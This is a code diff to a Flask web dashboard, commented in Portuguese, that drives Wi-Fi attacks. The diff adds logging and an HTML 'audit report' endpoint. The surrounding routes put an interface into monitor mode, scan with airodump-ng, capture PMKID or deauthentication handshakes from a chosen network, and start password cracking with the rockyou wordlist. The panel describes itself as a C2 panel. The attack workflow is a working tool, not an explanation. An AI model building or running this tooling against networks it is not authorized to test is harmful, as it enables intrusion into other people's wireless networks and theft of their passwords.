@@ -15,10 +15,55 @@ CURRENT_MONITOR_IFACE = None
 SCAN_PROCESS = None
 CSV_PREFIX = "web_scan_results"
 
+# --- Sistema de Logs e Relatório ---
+SESSION_LOGS = []
+COMMAND_HISTORY = []
+
+def add_log(msg, is_command=False):
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    formatted_msg = f"[{timestamp}] {msg}"
+    SESSION_LOGS.append(formatted_msg)
+    if is_command:
+        COMMAND_HISTORY.append({"time": timestamp, "data": msg})
+    print(formatted_msg)
+
 @app.route('/')
 def dashboard():
     """ Renderiza o Front-End Cyberpunk """
     return render_template('index.html')
+
+@app.route('/api/logs', methods=['GET'])
+def get_logs():
+    return jsonify({"status": "success", "logs": SESSION_LOGS})
+
+@app.route('/api/report', methods=['GET'])
+def get_report():
+    report_html = f"""
+    <html>
+    <head>
+        <title>Relatório de Auditoria DSI</title>
+        <style>
+            body {{ font-family: sans-serif; background: #f4f4f4; padding: 20px; }}
+            .report-container {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
+            h1 {{ color: #2c3e50; border-bottom: 2px solid #2c3e50; padding-bottom: 10px; }}
+            .command-log {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 4px; font-family: monospace; }}
+            .footer {{ margin-top: 20px; font-size: 0.8em; color: #7f8c8d; }}
+        </style>
+    </head>
+    <body>
+        <div class="report-container">
+            <h1>Relatório de Auditoria Wi-Fi - DSI Expert</h1>
+            <p><strong>Data:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+            <h3>Histórico de Comandos e Ações:</h3>
+            <div class="command-log">
+                {"<br>".join([f"[{c['time']}] {c['data']}" for c in COMMAND_HISTORY])}
+            </div>
+            <p class="footer">Gerado automaticamente pelo DSI Web Auditor System.</p>
+        </div>
+    </body>
+    </html>
+    """
+    return report_html
 
 @app.route('/api/interfaces', methods=['GET'])
 def get_interfaces():
@@ -38,12 +83,15 @@ def start_monitor():
     
     if not iface:
         return jsonify({"status": "error", "message": "Nenhuma interface providenciada"}), 400
-        
+    
+    add_log(f"Comando recebido: Armar modo monitor na interface {iface}", is_command=True)
     CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
     
     if CURRENT_MONITOR_IFACE:
+        add_log(f"Sucesso: Interface {CURRENT_MONITOR_IFACE} em modo monitor.")
         return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
     else:
+        add_log(f"Erro ao armar modo monitor na interface {iface}")
         return jsonify({"status": "error", "message": "Falha ao armar o modo monitor (veja logs no terminal)"}), 500
 
 @app.route('/api/start_scan', methods=['POST'])
@@ -51,12 +99,12 @@ def start_scan():
     global SCAN_PROCESS, CURRENT_MONITOR_IFACE
     if not CURRENT_MONITOR_IFACE:
         return jsonify({"status": "error", "message": "Modo monitor não está ativo."}), 400
-        
+    
+    add_log(f"Iniciando Radar Airodump-ng na interface {CURRENT_MONITOR_IFACE}", is_command=True)
     # Limpa arquivos antigos
     run_command(f"rm -f {CSV_PREFIX}-01.*")
     
     # Roda o airodump silenciosamente no fundo para alimentar o CSV
-    # --update 1 força o airodump a escrever no arquivo mais rápido
     cmd = f"airodump-ng --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
     SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
@@ -66,6 +114,7 @@ def start_scan():
 def stop_scan():
     global SCAN_PROCESS
     if SCAN_PROCESS:
+        add_log("Parando Radar de Espectro.", is_command=True)
         SCAN_PROCESS.terminate()
         run_command("killall airodump-ng", sudo=True)
         SCAN_PROCESS = None
@@ -121,33 +170,39 @@ def launch_attack():
     essid = data.get('essid')
     attack_type = data.get('attack_type')
     
+    add_log(f"Iniciando Ataque {attack_type.upper()} contra {essid} ({bssid}) no canal {channel}", is_command=True)
+    
     prefix = f"web_capture_{essid.replace(' ', '_')}"
     
-    # ATENÇÃO: Essa função trava a thread do Flask enquanto ataca (30-60 segundos).
-    # Como é um painel C2 local monousuário, isso não é um problema.
     cap_file = None
     if attack_type == 'pmkid':
+        add_log("Vetor: PMKID Stealth (Clientless)...")
         cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
-        if not cap_file: # Fallback automátic PhD mode
+        if not cap_file:
+             add_log("PMKID falhou. Tentando fallback para Handshake tradicional...")
              cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
     else:
+        add_log("Vetor: Handshake Adaptativo (Deauth)...")
         cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
 
     if cap_file:
-        # Se capturou, tenta iniciar a força bruta em uma thread paralela
-        # A wordlist rockyou é muito comum no Kali:
+        add_log(f"Sucesso! Chave retida em: {cap_file}")
         wordlist = "/usr/share/wordlists/rockyou.txt"
         if os.path.exists(wordlist):
+            add_log(f"Iniciando Crack de Senha em background usando: {wordlist}")
             threading.Thread(target=crack_hash, args=(cap_file, wordlist, bssid)).start()
-            return jsonify({"status": "success", "message": "Handshake Retido. Cracking (Força Bruta) rolando no terminal backend.", "cap_file": cap_file})
+            return jsonify({"status": "success", "message": "Handshake Retido. Cracking em background.", "cap_file": cap_file})
         else:
-            return jsonify({"status": "success", "message": f"Handshake salvo em {cap_file}. Wordlist padrão (rockyou) não encontrada para cracking automático.", "cap_file": cap_file})
+            add_log("Handshake capturado, mas wordlist padrão não encontrada para crack automático.")
+            return jsonify({"status": "success", "message": f"Handshake salvo em {cap_file}.", "cap_file": cap_file})
             
+    add_log("Ataque falhou: Alvo não respondeu aos estímulos.")
     return jsonify({"status": "error", "message": "O Roteador alvo bloqueou o ataque ou não há clientes conectados."})
 
 @app.route('/api/restore', methods=['POST'])
 def restore():
     global CURRENT_MONITOR_IFACE, SCAN_PROCESS
+    add_log("Comando recebido: Restaurar sistema para modo civil", is_command=True)
     if SCAN_PROCESS:
         SCAN_PROCESS.terminate()
         run_command("killall airodump-ng", sudo=True)
@@ -156,6 +211,7 @@ def restore():
     if CURRENT_MONITOR_IFACE:
         set_managed_mode(CURRENT_MONITOR_IFACE)
         CURRENT_MONITOR_IFACE = None
+        add_log("Sistema restaurado com sucesso.")
         return jsonify({"status": "success", "message": "Placa de rede civil restabelecida."})
     
     return jsonify({"status": "success", "message": "Nada a restaurar."})
